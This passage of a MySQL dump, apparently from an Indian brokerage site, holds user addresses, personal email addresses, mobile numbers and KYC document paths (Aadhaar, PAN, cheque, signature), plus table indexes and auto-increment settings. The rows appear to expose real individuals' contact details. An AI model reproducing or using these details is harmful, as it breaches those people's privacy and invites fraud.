INSERT INTO `tbl_user_address` (`id`, `user_id`, `address1`, `address2`, `address3`, `address4`, `pincode`, `state_id`, `state_name`, `country_id`, `country_name`, `address_proof_id`, `address_proof_no`, `address_proof_id_validity`, `is_permanent_address`, `created_on`) VALUES
(3, 175, 'SAPAMIRZANAGAR, Sarkarpool, South 24', 'Maheshtala (M)', '', '', '700143', 0, 'West Bengal', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-15'),
(4, 175, 'SAPAMIRZANAGAR, Sarkarpool, South 24', 'Maheshtala (M)', '', '', '700143', 0, 'West Bengal', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-15'),
(5, 176, 'NISHAT COLONY, C.T.T.Nagar, Bhopal', 'Huzur', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-16'),
(6, 176, 'NISHAT COLONY, C.T.T.Nagar, Bhopal', 'Huzur', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-16'),
(7, 177, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-17'),
(8, 177, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-17'),
(9, 174, 'malakhedi road, Hoshangabad, Hoshang', 'Hoshangabad', '', '', '461001', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-18'),
(10, 174, 'malakhedi road, Hoshangabad, Hoshang', 'Hoshangabad', '', '', '461001', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-18'),
(11, 180, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-31'),
(12, 180, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-31'),
(13, 181, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-05-31'),
(14, 181, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-05-31'),
(15, 184, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-06-02'),
(16, 184, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-06-02'),
(17, 186, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-06-02'),
(18, 186, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-06-02'),
(19, 187, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-06-02'),
(20, 187, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-06-02'),
(21, 188, 'NISHAT COLONY, C.T.T.Nagar, Bhopal', 'Huzur', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-06-02'),
(22, 188, 'NISHAT COLONY, C.T.T.Nagar, Bhopal', 'Huzur', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '1', '2017-06-02'),
(23, 189, 'Jyotiba Phule Nagar, C.T.T. Nagar, B', 'Bhopal', '', '', '462003', 0, 'Madhya Pradesh', 0, 'India', 7, '', '0000-00-00', '0', '2017-06-02'),
(7354, 4507, 'Rola ', 'Rola Sihore Mungavli', '\n    ', 'Sehore', '466001', 23, 'Nagaland', 101, 'Indonesia', 31, '', '0000-00-00', '1', '2018-06-06'),
(7355, 4507, 'Rola ', 'Rola Sihore Mungavli', '\n    ', 'Sehore', '466001', 23, '', 101, 'Indonesia', 31, '', '0000-00-00', '0', '2018-06-06'),
(7356, 4508, 'BANDHPUKUR KANDI KANDI MURSHIDABAD', 'NEAR OIL MILL', 'null', 'MURSHIDABAD', '742137', 19, 'Maharashtra', 101, 'Indonesia', 6, '', '0000-00-00', '1', '2018-06-06'),
(7357, 4508, 'BANDHPUKUR KANDI KANDI MURSHIDABAD', 'NEAR OIL MILL', 'null', 'MURSHIDABAD', '742137', 19, '', 101, 'Indonesia', 6, '', '0000-00-00', '0', '2018-06-06');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user_address_proof_doc`
--

CREATE TABLE `tbl_user_address_proof_doc` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `addressproofdoc_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user_email`
--

CREATE TABLE `tbl_user_email` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `emailaddress` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user_email`
--

INSERT INTO `tbl_user_email` (`id`, `user_id`, `emailaddress`) VALUES
(1, 1, 'contact@asthatrade.com'),
(317, 173, 'manishbera19931@gmail.com'),
(319, 175, 'manish1bera1993@gmail.com'),
(334, 190, 'isunilgupta0722@gmail.com'),
(335, 191, 'pamit258@gmail.com'),
(337, 193, 'sahnisan999@gmail.com'),
(338, 194, 'kailasbedarkar4@gmail.com'),
(343, 199, 'kailasbedarkar@gmail.com'),
(359, 220, 'swapnilc090@gmail.com'),
(366, 228, 'yogesh@websitesupport24x7.com'),
(368, 230, 'yogesh@websitestupport24x7.com'),
(371, 233, 'yogesh@websitetoon.com'),
(4644, 4506, 'testingbyprashant@gmail.com'),
(4645, 4507, 'testingbyme1@gmail.com'),
(4646, 4508, 'sourav1996kandi@gmail.com');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user_ph`
--

CREATE TABLE `tbl_user_ph` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `ph_code` varchar(10) NOT NULL COMMENT '4 digits for Tel(Off), 4 digits for Tel(Res), 3 Digits for Mobile and 4 Digits for Fax',
  `ph` varchar(20) NOT NULL,
  `ph_type` enum('1','2','3','4') NOT NULL DEFAULT '1' COMMENT '1 for mobile, 2 for office, 3 for home,4 for fax'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user_ph`
--

INSERT INTO `tbl_user_ph` (`id`, `user_id`, `ph_code`, `ph`, `ph_type`) VALUES
(1, 1, '', '9836632544', '1'),
(560, 173, '', '8435001551', '1'),
(561, 174, '', '8435001551', '1'),
(562, 175, '', '8981295907', '1'),
(563, 176, '', '8889485566', '1'),
(564, 177, '', '8435001551', '1'),
(565, 178, '', '8435001551', '1'),
(566, 179, '', '8435001551', '1'),
(567, 180, '', '8889485566', '1'),
(568, 181, '', '8889485566', '1'),
(569, 182, '', '8435001551', '1'),
(570, 183, '', '8435001551', '1'),
(571, 184, '', '8435001551', '1'),
(572, 185, '', '8435001551', '1'),
(573, 186, '', '8435001551', '1'),
(574, 187, '', '8435001551', '1'),
(575, 188, '', '8435001551', '1'),
(576, 189, '', '8435001551', '1'),
(577, 190, '', '9977065007', '1'),
(4964, 4504, '', '8435001551', '1'),
(4965, 4505, '', '7025636311', '1'),
(4966, 4506, '', '8889485566', '1'),
(4967, 4507, '', '8889485566', '1'),
(4968, 4508, '', '9734332707', '1');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_user_upload_doc_proof`
--

CREATE TABLE `tbl_user_upload_doc_proof` (
  `id` int(10) NOT NULL COMMENT 'Auto Increment Id',
  `user_id` int(10) NOT NULL COMMENT 'User ID',
  `sub_cat_id` int(10) NOT NULL COMMENT 'Document Sub Category ID',
  `uploaded_path` text NOT NULL COMMENT 'Uploaded Path',
  `file_name` text NOT NULL COMMENT 'Uploaded File Name',
  `upload_status` enum('0','1') NOT NULL DEFAULT '0' COMMENT 'Upload Status',
  `created_on` date NOT NULL COMMENT 'Date of Row Creation',
  `modified_on` date NOT NULL COMMENT 'Modified Date'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_user_upload_doc_proof`
--

INSERT INTO `tbl_user_upload_doc_proof` (`id`, `user_id`, `sub_cat_id`, `uploaded_path`, `file_name`, `upload_status`, `created_on`, `modified_on`) VALUES
(1, 3043, 12, './uploads/eKyc_without_ESign/3043', 'pancard_proof.jpg', '1', '2018-04-07', '0000-00-00'),
(2, 3043, 13, './uploads/eKyc_without_ESign/3043', 'aadhaar_front.jpg', '1', '2018-04-07', '0000-00-00'),
(3, 3043, 14, './uploads/eKyc_without_ESign/3043', 'aadhaar_back.jpg', '1', '2018-04-07', '0000-00-00'),
(4, 3043, 7, './uploads/eKyc_without_ESign/3043', 'cancelled_cheque.jpg', '1', '2018-04-07', '0000-00-00'),
(5, 3043, 8, './uploads/eKyc_without_ESign/3043', 'income_proof.pdf', '1', '2018-04-07', '0000-00-00'),
(6, 3043, 11, './uploads/eKyc_without_ESign/3043', 'signature.jpg', '1', '2018-04-07', '0000-00-00'),
(7, 3035, 13, './uploads/eKyc_without_ESign/3035', 'aadhaar_front.jpg', '1', '2018-04-07', '0000-00-00'),
(8, 3035, 14, './uploads/eKyc_without_ESign/3035', 'aadhaar_back.jpg', '1', '2018-04-07', '0000-00-00'),
(9, 3035, 7, './uploads/eKyc_without_ESign/3035', 'cancelled_cheque.jpg', '1', '2018-04-07', '0000-00-00'),
(10, 3035, 8, './uploads/eKyc_without_ESign/3035', 'income_proof.pdf', '1', '2018-04-07', '0000-00-00'),
(11, 3035, 11, './uploads/eKyc_without_ESign/3035', 'signature.jpg', '1', '2018-04-07', '0000-00-00'),
(12, 3039, 12, './uploads/eKyc_without_ESign/3039', 'pancard_proof.PNG', '1', '2018-04-07', '0000-00-00'),
(13, 3039, 13, './uploads/eKyc_without_ESign/3039', 'aadhaar_front.PNG', '1', '2018-04-07', '0000-00-00'),
(14, 3039, 14, './uploads/eKyc_without_ESign/3039', 'aadhaar_back.PNG', '1', '2018-04-07', '0000-00-00'),
(15, 3039, 7, './uploads/eKyc_without_ESign/3039', 'cancelled_cheque.jpg', '1', '2018-04-07', '0000-00-00'),
(16, 3039, 8, './uploads/eKyc_without_ESign/3039', 'income_proof.pdf', '1', '2018-04-07', '0000-00-00'),
(17, 3039, 11, './uploads/eKyc_without_ESign/3039', 'signature.jpg', '1', '2018-04-07', '0000-00-00'),
(18, 2886, 12, './uploads/eKyc_without_ESign/2886', 'pancard_proof.jpg', '1', '2018-04-07', '0000-00-00'),
(19, 2886, 13, './uploads/eKyc_without_ESign/2886', 'aadhaar_front.jpg', '1', '2018-04-07', '0000-00-00'),
(20, 2886, 14, './uploads/eKyc_without_ESign/2886', 'aadhaar_back.jpg', '1', '2018-04-07', '0000-00-00'),
(21, 2886, 7, './uploads/eKyc_without_ESign/2886', 'cancelled_cheque.jpg', '1', '2018-04-07', '0000-00-00'),
(22, 2886, 8, './uploads/eKyc_without_ESign/2886', 'income_proof.pdf', '1', '2018-04-07', '0000-00-00'),
(23, 2886, 11, './uploads/eKyc_without_ESign/2886', 'signature.jpg', '1', '2018-04-07', '0000-00-00'),
(4311, 4503, 14, './uploads/eKyc_without_ESign/4503', 'aadhaar_back.jpg', '1', '2018-06-06', '0000-00-00'),
(4312, 4503, 7, './uploads/eKyc_without_ESign/4503', 'cancelled_cheque.jpg', '1', '2018-06-06', '0000-00-00'),
(4313, 4503, 8, './uploads/eKyc_without_ESign/4503', 'income_proof.pdf', '1', '2018-06-06', '0000-00-00'),
(4314, 4503, 11, './uploads/eKyc_without_ESign/4503', 'signature.jpg', '1', '2018-06-06', '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_video`
--

CREATE TABLE `tbl_video` (
  `id` int(11) NOT NULL,
  `faq_id` int(11) NOT NULL,
  `videopath` varchar(250) NOT NULL,
  `videotype` enum('1','2') NOT NULL DEFAULT '1' COMMENT '1 for youtube 2 for upload',
  `position` int(3) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `account_status`
--
ALTER TABLE `account_status`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `all_accounts_received`
--
ALTER TABLE `all_accounts_received`
  ADD PRIMARY KEY (`user_id`);

--
-- Indexes for table `live_call`
--
ALTER TABLE `live_call`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `live_call_category`
--
ALTER TABLE `live_call_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `series`
--
ALTER TABLE `series`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_account_pay`
--
ALTER TABLE `tbl_account_pay`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_addressproof`
--
ALTER TABLE `tbl_addressproof`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_contact`
--
ALTER TABLE `tbl_contact`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_countries`
--
ALTER TABLE `tbl_countries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_enquiry`
--
ALTER TABLE `tbl_enquiry`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_faq`
--
ALTER TABLE `tbl_faq`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_faq_category`
--
ALTER TABLE `tbl_faq_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_fund_status`
--
ALTER TABLE `tbl_fund_status`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_get_referral_benifit`
--
ALTER TABLE `tbl_get_referral_benifit`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_issue`
--
ALTER TABLE `tbl_issue`
  ADD PRIMARY KEY (`issue_id`);

--
-- Indexes for table `tbl_issue_category`
--
ALTER TABLE `tbl_issue_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_issue_reply`
--
ALTER TABLE `tbl_issue_reply`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_occupation`
--
ALTER TABLE `tbl_occupation`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_payopt`
--
ALTER TABLE `tbl_payopt`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_states`
--
ALTER TABLE `tbl_states`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_states_international`
--
ALTER TABLE `tbl_states_international`
  ADD PRIMARY KEY (`id`),
  ADD KEY `cog_states_FI_1` (`cog_countries_id`);

--
-- Indexes for table `tbl_subbroker_request`
--
ALTER TABLE `tbl_subbroker_request`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_transaction`
--
ALTER TABLE `tbl_transaction`
  ADD PRIMARY KEY (`transaction`);

--
-- Indexes for table `tbl_upload_doc_category`
--
ALTER TABLE `tbl_upload_doc_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_upload_doc_cat_desc`
--
ALTER TABLE `tbl_upload_doc_cat_desc`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_useraccountdetails`
--
ALTER TABLE `tbl_useraccountdetails`
  ADD PRIMARY KEY (`useraccountdetailsid`);

--
-- Indexes for table `tbl_userdetails`
--
ALTER TABLE `tbl_userdetails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user_address`
--
ALTER TABLE `tbl_user_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user_address_proof_doc`
--
ALTER TABLE `tbl_user_address_proof_doc`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_user_email`
--
ALTER TABLE `tbl_user_email`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `emailaddress` (`emailaddress`),
  ADD UNIQUE KEY `user_id` (`user_id`),
  ADD KEY `user_id_2` (`user_id`);

--
-- Indexes for table `tbl_user_ph`
--
ALTER TABLE `tbl_user_ph`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `tbl_user_upload_doc_proof`
--
ALTER TABLE `tbl_user_upload_doc_proof`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tbl_video`
--
ALTER TABLE `tbl_video`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `account_status`
--
ALTER TABLE `account_status`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1401;
--
-- AUTO_INCREMENT for table `live_call`
--
ALTER TABLE `live_call`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;
--
-- AUTO_INCREMENT for table `live_call_category`
--
ALTER TABLE `live_call_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT for table `series`
--
ALTER TABLE `series`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `tbl_account_pay`
--
ALTER TABLE `tbl_account_pay`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Auto Increment Id of this Table', AUTO_INCREMENT=8224;
--
-- AUTO_INCREMENT for table `tbl_addressproof`
--
ALTER TABLE `tbl_addressproof`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT for table `tbl_contact`
--
ALTER TABLE `tbl_contact`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `tbl_countries`
--
ALTER TABLE `tbl_countries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=247;
--
-- AUTO_INCREMENT for table `tbl_enquiry`
--
ALTER TABLE `tbl_enquiry`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=197;
--
-- AUTO_INCREMENT for table `tbl_faq`
--
ALTER TABLE `tbl_faq`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=94;
--
-- AUTO_INCREMENT for table `tbl_faq_category`
--
ALTER TABLE `tbl_faq_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `tbl_fund_status`
--
ALTER TABLE `tbl_fund_status`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT for table `tbl_get_referral_benifit`
--
ALTER TABLE `tbl_get_referral_benifit`
  MODIFY `id` int(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;
--
-- AUTO_INCREMENT for table `tbl_issue`
--
ALTER TABLE `tbl_issue`
  MODIFY `issue_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `tbl_issue_category`
--
ALTER TABLE `tbl_issue_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `tbl_issue_reply`
--
ALTER TABLE `tbl_issue_reply`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `tbl_occupation`
--
ALTER TABLE `tbl_occupation`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=100;
--
-- AUTO_INCREMENT for table `tbl_payopt`
--
ALTER TABLE `tbl_payopt`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;
--
-- AUTO_INCREMENT for table `tbl_states`
--
ALTER TABLE `tbl_states`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1472;
--
-- AUTO_INCREMENT for table `tbl_states_international`
--
ALTER TABLE `tbl_states_international`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5001;
--
-- AUTO_INCREMENT for table `tbl_subbroker_request`
--
ALTER TABLE `tbl_subbroker_request`
  MODIFY `id` int(50) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;
--
-- AUTO_INCREMENT for table `tbl_transaction`
--
ALTER TABLE `tbl_transaction`
  MODIFY `transaction` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4940;
--
-- AUTO_INCREMENT for table `tbl_upload_doc_category`
--
ALTER TABLE `tbl_upload_doc_category`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Auto Increment Id', AUTO_INCREMENT=15;
--
-- AUTO_INCREMENT for table `tbl_upload_doc_cat_desc`
--
ALTER TABLE `tbl_upload_doc_cat_desc`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Autro Increment ID', AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT for table `tbl_useraccountdetails`
--
ALTER TABLE `tbl_useraccountdetails`
  MODIFY `useraccountdetailsid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2468;
--
-- AUTO_INCREMENT for table `tbl_userdetails`
--
ALTER TABLE `tbl_userdetails`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4509;
--
-- AUTO_INCREMENT for table `tbl_user_address`
--
ALTER TABLE `tbl_user_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7358;
--
-- AUTO_INCREMENT for table `tbl_user_address_proof_doc`
--
ALTER TABLE `tbl_user_address_proof_doc`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `tbl_user_email`
--
ALTER TABLE `tbl_user_email`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4647;
--
-- AUTO_INCREMENT for table `tbl_user_ph`
--
ALTER TABLE `tbl_user_ph`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4969;
--
-- AUTO_INCREMENT for table `tbl_user_upload_doc_proof`
--
ALTER TABLE `tbl_user_upload_doc_proof`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Auto Increment Id', AUTO_INCREMENT=4315;
--
-- AUTO_INCREMENT for table `tbl_video`
--
ALTER TABLE `tbl_video`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
